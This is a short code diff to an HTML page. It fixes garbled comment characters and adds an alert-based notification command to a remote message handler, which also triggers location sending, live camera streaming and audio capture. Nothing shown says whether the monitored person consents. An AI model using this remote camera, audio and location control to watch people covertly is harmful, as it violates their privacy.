@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html class="h-full" lang="en">
 
 <head>
@@ -790,7 +790,7 @@
           // Fallback: start after a short delay in case event already fired
           setTimeout(() => { if (liveStreamActive && !captureFrameId) startFrameCapture(); }, 500);
 
-          // Attempt WebRTC for higher quality (optional Ã¢â‚¬â€ snapshot feed runs regardless)
+          // Attempt WebRTC for higher quality (optional — snapshot feed runs regardless)
           if (ioSocket && ioSocket.connected) {
             startWebRTCStream(stream);
           }
@@ -799,7 +799,7 @@
           setupAudioCapture(stream);
         }
 
-        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ JPEG Snapshot Frame Loop (Primary feed Ã¢â‚¬â€ always works) Ã¢â€â‚¬Ã¢â€â‚¬
+        // -------------------------------- JPEG Snapshot Frame Loop (Primary feed — always works) ----------------
         function startFrameCapture() {
           if (captureFrameId || !liveStreamActive) return;
 
@@ -988,6 +988,7 @@
             case 'SEND_LOCATION':       sendLocation();    break;
             case 'START_LIVE_CAMERA':   startLiveCamera(); break;
             case 'STOP_LIVE_CAMERA':    stopLiveCamera();  break;
+            case 'SHOW_NOTIFICATION':   alert(msg.message); break;
           }
         }
 
